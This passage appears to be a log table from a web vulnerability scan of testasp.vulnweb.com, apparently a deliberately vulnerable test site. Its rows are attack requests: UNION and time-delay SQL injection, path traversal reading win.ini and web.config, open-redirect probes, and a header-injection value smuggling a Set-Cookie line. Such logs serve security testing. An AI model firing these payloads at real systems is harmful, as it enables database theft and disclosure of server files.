| 173 | 302 | GET | `http://testasp.vulnweb.com/Logout.asp?RetURL=http://example.com/` |
| 174 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.dbo.comments) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 175 | 404 | GET | `http://testasp.vulnweb.com/Default~1.asp` |
| 176 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp
Set-Cookie: x=1` |
| 177 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,'ACU-VERIFY-OK','T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 178 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=1 WAITFOR DELAY '0:0:03'--` |
| 179 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=2 WAITFOR DELAY '0:0:03'--` |
| 180 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../windows/win.ini` |
| 181 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=html/../web.config` |
| 182 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=db.asp` |
| 183 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=http://example.com/` |
| 184 | 302 | GET | `http://testasp.vulnweb.com/Logout.asp?RetURL=http://example.com/` |
| 185 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.dbo.comments) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 186 | 404 | GET | `http://testasp.vulnweb.com/Default~1.asp` |
| 187 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp
Set-Cookie: x=1` |
